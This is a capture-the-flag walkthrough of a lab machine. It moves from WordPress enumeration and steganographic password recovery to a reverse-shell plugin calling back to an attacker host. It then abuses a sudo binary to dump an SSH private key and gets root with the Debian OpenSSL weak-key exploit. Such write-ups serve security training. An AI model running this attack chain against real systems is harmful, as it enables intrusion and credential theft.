### **Target: `10.0.0.12`**
### **Difficulty: `Medium`**

# 1. Enumeration

    root@kali ~# nmap -sS -p- -A -T4 10.0.0.12

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                       
    | ssh-hostkey:                                                                                            
    |   2048 81:f5:0a:b3:b5:0d:a6:ed:ce:53:93:05:15:17:b1:b0 (RSA)                                            
    |   256 fd:7c:3d:73:f6:a4:c1:74:7b:41:27:68:ec:54:c4:61 (ECDSA)                                           
    |_  256 8c:28:b7:7b:5d:5c:f1:29:91:4e:85:34:26:55:ac:c6 (ED25519)                                         
    80/tcp open  http    Apache httpd 2.4.38 ((Debian))                                                       
    |_http-title: Apache2 Ubuntu Default Page: It works Annex02!                                              
    |_http-server-header: Apache/2.4.38 (Debian)

The NMAP scan showed that the machine has a web server online and an SSH server. Let's start by enumerating the HTTP server.

## *- HTTP*

    root@kali ~/D/M/Klim# gobuster dir -u http://10.0.0.12 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x txt,php,html

    /index.html           (Status: 200) [Size: 11331]
    /wordpress            (Status: 301) [Size: 310] [--> http://10.0.0.12/wordpress/]

Let's go to **http://10.0.0.12/wordpress** and see what we can find there.

![image](https://user-images.githubusercontent.com/76552238/181997260-fe48c497-27d1-4d0d-8adb-e44a08564861.png)

Let's run ***[wpscan][1]*** on the wordpress directory.

    root@kali ~/D/M/Klim# wpscan -e u,p,t -v --url http://10.0.0.12/wordpress

    [+] WordPress version 5.8 identified (Insecure, released on 2021-07-20).

    [i] User(s) Identified:

    [+] klim

Since we have a username I tried to brute force the password using but found nothing. I scanned some more and found an image on **http://10.0.0.12/wordpress/wp-content/uploads/2021/07/image.jpg**.

![image](https://user-images.githubusercontent.com/76552238/182025385-946e5a80-b735-4e95-be90-cbcf136d163e.png)

This image is very random and doesn't give us any information on the surface so maybe it has hidden files. Let's use [**steghide**][2] and [**stegcracker**][3] to possibly extract the files from the image.

    root@kali ~/D/M/Klim# steghide extract -sf image.jpg
    Enter passphrase: 
    steghide: could not extract any data with that passphrase!

In order to extract the files we need to find the right passphrase.

    root@kali ~/D/M/Klim [1]# stegcracker image.jpg
    StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
    Copyright (c) 2022 - Luke Paris (Paradoxis)

    StegCracker has been retired following the release of StegSeek, which 
    will blast through the rockyou.txt wordlist within 1.9 second as opposed 
    to StegCracker which takes ~5 hours.

    StegSeek can be found at: https://github.com/RickdeJager/stegseek

    No wordlist was specified, using default rockyou.txt wordlist.
    Counting lines in wordlist..
    Attacking file 'image.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
    Successfully cracked file with password: ichliebedich
    Tried 5297 passwords
    Your file has been written to: image.jpg.out
    ichliebedich

Reading the file ***image.jpg.out*** it seems like an HTTP request to the login page.

    ....c..6POST /wordpress/wp-login.php HTTP/1.1
    Host: 192.168.0.26
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Referer: http://192.168.0.26/wordpress/wp-login.php?loggedout=true&wp_lang=en_US
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 127
    Origin: http://192.168.0.26
    Connection: keep-alive
    Cookie: wordpress_test_cookie=WP+Cookie+check
    Upgrade-Insecure-Requests: 1
    log=klim&pwd=ss7WhrrnnHOZC%239bQn&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.0.26%2Fwordpress%2Fwp-admin%2F&testcookie=1

Looking at the ***pwd*** parameter we can see the string ***ss7WhrrnnHOZC%239bQn***. After url decoding it we get this password ***'ss7WhrrnnHOZC#9bQn'*** for the user ***'klim'***.

![image](https://user-images.githubusercontent.com/76552238/182025629-31ef60ee-f57c-466a-ba14-c247733dc8e3.png)

![image](https://user-images.githubusercontent.com/76552238/182025639-c8764407-9b02-4112-92a4-b10d29cba8ac.png)

Let's try to edit one of the php file to a [***PHP reverse shell***][4] script. 

![image](https://user-images.githubusercontent.com/76552238/182030790-b2ecb201-3178-4896-adf0-cf2dd0dea24d.png)

For some reason we get this error. Let's try to upload a plugin and get a reverse shell. I found [**Python script**][5] on github that makes a Wordpress plugin that gives a reverse shell.

    root@kali ~/D/T/W/malicious-wordpress-plugin (master)# python wordpwn.py 10.0.0.27 4444 Y
    [*] Checking if msfvenom installed
    [+] msfvenom installed
    [+] Generating plugin script
    [+] Writing plugin script to file
    [+] Generating payload To file
    [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
    [-] No arch selected, selecting arch: php from the payload
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of php/base64
    php/base64 succeeded with size 1503 (iteration=0)
    php/base64 chosen with final size 1503
    Payload size: 1503 bytes

    [+] Writing files to zip
    [+] Cleaning up files
    [+] URL to upload the plugin: http://(target)/wp-admin/plugin-install.php?tab=upload
    [+] How to trigger the reverse shell : 
        ->   http://(target)/wp-content/plugins/malicious/wetw0rk_maybe.php
        ->   http://(target)/wp-content/plugins/malicious/QwertyRocks.php
    [+] Launching handler

After adding the malicious plugin we can go to http://10.0.0.12/wp-content/plugins/malicious/wetw0rk_maybe.php and get a meterpreter shell.

![image](https://user-images.githubusercontent.com/76552238/182031255-de788e43-a665-49dc-9ec1-f8fb04acfa23.png)

# 2. Privilege Escalation

    www-data@klim:/home$ ls -l
    total 4
    drwxr-xr-x 4 klim klim 4096 Jul 25  2021 klim

Going to the ***/home*** directory there is a directory for the user **'klim'**.

    www-data@klim:/home/klim$ ls -l
    ls -l
    total 24
    -rwxr-xr-x 1 klim klim 16816 Jul 24  2021 tool
    -rwx------ 1 klim klim    33 Jul 25  2021 user.txt

    www-data@klim:/home/klim$ file tool
    tool: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4fb726006af09fe96ef49dba64a83308076800bc, for GNU/Linux 3.2.0, not stripped


We don't have permission to read the first flag.  

    www-data@klim:/home/klim$ sudo -ll
    Matching Defaults entries for www-data on klim:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User www-data may run the following commands on klim:

    Sudoers entry:
        RunAsUsers: klim
        Options: !authenticate
        Commands:
            /home/klim/tool

The user **'www-data'** can run the binary on the ***/home/klim directory*** as the user **'klim'**. Let's see what is does and how we can exploit it.

    www-data@klim:/home/klim$ ./tool
    Segmentation fault

Let's give it a parameter.

    www-data@klim:/home/klim$ ./tool test
    cat: test: No such file or directory

We know the ***cat*** command is used here. We can confirm this again by using the strings command.

![image](https://user-images.githubusercontent.com/76552238/182038193-dbcd3607-ccdd-4133-8244-235fd44e084f.png)

Changing the PATH environment variable will not work because using sudo we are running the command as the user klim and we can't change his PATH variable.

Since the binary uses the cat command and we run it as the user klim we can read files out of our permissions.

    www-data@klim:/home/klim$ sudo -u klim ./tool user.txt
    2fbef74059deaea1e5e11cff5a65b68e

Let's read the private key of the user klim and connect over ssh.

    www-data@klim:/home/klim$ ls -la
    ls -la
    total 52
    drwxr-xr-x 4 klim klim  4096 Jul 25  2021 .
    drwxr-xr-x 3 root root  4096 Jul  4  2021 ..
    lrwxrwxrwx 1 root root     9 Jul 24  2021 .bash_history -> /dev/null
    -rw-r--r-- 1 klim klim   220 Jul  4  2021 .bash_logout
    -rw-r--r-- 1 klim klim  3526 Jul  4  2021 .bashrc
    drwx------ 3 klim klim  4096 Jul 24  2021 .gnupg
    -rw-r--r-- 1 klim klim   807 Jul  4  2021 .profile
    drwx------ 2 klim klim  4096 Jul 24  2021 .ssh
    -rwxr-xr-x 1 klim klim 16816 Jul 24  2021 tool
    -rwx------ 1 klim klim    33 Jul 25  2021 user.txt

    www-data@klim:/home/klim$ sudo -u klim ./tool .ssh/id_rsa
    -----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
    NhAAAAAwEAAQAAAQEA0IBOKXuvWzdN/rTJXWZ7b1FadoLr5jQZ+LkaEJDWaUnYFlCpNd4e
    zX0FclbdzkUAmQJK7KHBMpc5sfWnie6SNqg90fjLeh/hRkwkvrlYyyo9ixLmmEOEekRUt5
    2ClZQ3Em0DLcwqyFh5i0bShVCe+w9ytRLdMY4atFLxPumBAR7FEjE7BNZklDf3ru2Ha2AQ
    j3msaDz2rngO94CCqy2hqPnwTkZFvlenTgodG4MTHVPM77/41hWHhZQzRQNnNuuvbp/70Q
    2exig9djEY7Nuc4YtR2dK98z72jIpRRJioDR237r5z8nlSlMnYC7GD7ZKUbpp+I4GJ6Y0J
    TBvep0Z2iwAAA8BRETJcUREyXAAAAAdzc2gtcnNhAAABAQDQgE4pe69bN03+tMldZntvUV
    p2guvmNBn4uRoQkNZpSdgWUKk13h7NfQVyVt3ORQCZAkrsocEylzmx9aeJ7pI2qD3R+Mt6
    H+FGTCS+uVjLKj2LEuaYQ4R6RFS3nYKVlDcSbQMtzCrIWHmLRtKFUJ77D3K1Et0xjhq0Uv
    E+6YEBHsUSMTsE1mSUN/eu7YdrYBCPeaxoPPaueA73gIKrLaGo+fBORkW+V6dOCh0bgxMd
    U8zvv/jWFYeFlDNFA2c2669un/vRDZ7GKD12MRjs25zhi1HZ0r3zPvaMilFEmKgNHbfuvn
    PyeVKUydgLsYPtkpRumn4jgYnpjQlMG96nRnaLAAAAAwEAAQAAAQEAwnlqbjb3cNU84n4t
    8/hK2aHABxpGfgnKz7uXHCx8UOiXrPi/W4c6o+Ag3G05pdOmoxEIYX7efRmgruS6yGTF7E
    UwpFCzOc3SiYcsHtkygQ19KeMPQqZ3QrPJcRpxWqNMWttjQ6xTm1sqw0XjxoVUREg8bbiS
    qE4rilZyvoN92FPzfAHvyiV+CDb60ML476veN+C9bK06lr4AeAICG50FMfHpeSKAE12MAL
    OMz4DC8mP787yybBzSIUGbdBfxh+0Qm8+eJ+6CdPTywtGfzgdwp87uNrx4dvAiVrIMTTsb
    Dpc4CBhBbMwIC2bnOFvOBhvv70qYG/dGUVXQEYZYZQ5KQQAAAIEA2QFHUPDXAE7vaIIkLo
    TGTEgAwVCtdMQiqxbyrmfwqDg0Q7UCgCxThrybFLWbWkn76n4NpQdI5O25cZGtsdgkYXCc
    yUpWVxWkgBcvr3z2LLEvl6+a/JwNgobp40lZTumrFFUbEFBFczpq38NjoRWfznfneFX2OR
    x0jO5Ry3ayU78AAACBAPHhbAttr9qfgLl313uI3wFmI+UTmtbzNYwNOtSbbx5+x4IXpFHr
    dAVCIg1D/o2sFQb03vHDO3KyDDQdE903E9hg4pcxB3F7PwIilCcvXtJfKuDNQOd+CcfEMl
    zdNqOXenwHVbwCKuV1Aea7YP4pWqU6+9bAYjtT8Keu5exUwcGNAAAAgQDcrBLl5jJU1Drd
    jwq/pz/4h+tzLkK+HocyYZFSZ+3Q3Rv4CK7HeWC80rfLNsc3ZktG755/WQLlXCSJ50sUmp
    Fp3Lkp1BGomrgELk4qqf3aF291nYcnSZVu0AfvlRWHHa52o23nuhu/rdcTQX5Lh4kWhWyz
    49he3VMR4O2JnBj2dwAAAAlrbGltQGtsaW0=
    -----END OPENSSH PRIVATE KEY-----

We can not connect using the private key of the user.

    root@kali ~/D/M/Klim# ssh klim@10.0.0.14 -i id_rsa

    klim@klim:~$ id -a
    uid=1000(klim) gid=1000(klim) groupes=1000(klim),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

Going to the ***/opt*** directory we can find a public key for the user ***root***. After downloading it we can find out it was generated using ***openSSL***. Using an [exploit][6] for openSSL we can find the corresponding private key for the user root.

    root@kali ~/D/M/K/openssl_exploit# python2 exploit.py rsa/2048/ 10.0.0.14 root 22 5

    Key Found in file: 54701a3b124be15d4c8d3cf2da8f0139-2005
    Execute: ssh -lroot -p22 -i rsa/2048//54701a3b124be15d4c8d3cf2da8f0139-2005 10.0.0.14

    root@kali ~/D/M/K/openssl_exploit# ssh -lroot -p22 -i rsa/2048//54701a3b124be15d4c8d3cf2da8f0139-2005 10.0.0.14
    Linux klim 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.

    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    Last login: Sun Jul 31 23:43:03 2022 from 10.0.0.27
    root@klim:~# id -a
    uid=0(root) gid=0(root) groupes=0(root)

    root@klim:~# cat root.txt 
    60667e12c8ea62295de82d053d950e1f

[1]: "https://linuxcommandlibrary.com/man/wpscan"

[2]: "https://linuxcommandlibrary.com/man/steghide#:~:text=Steghide%20is%20a%20steganography%20program,against%20first%2Dorder%20statistical%20tests."

[3]: "https://www.kali.org/tools/stegcracker/"

[4]: "https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"

[5]: "https://github.com/wetw0rk/malicious-wordpress-plugin"

[6]: "https://www.exploit-db.com/exploits/5720"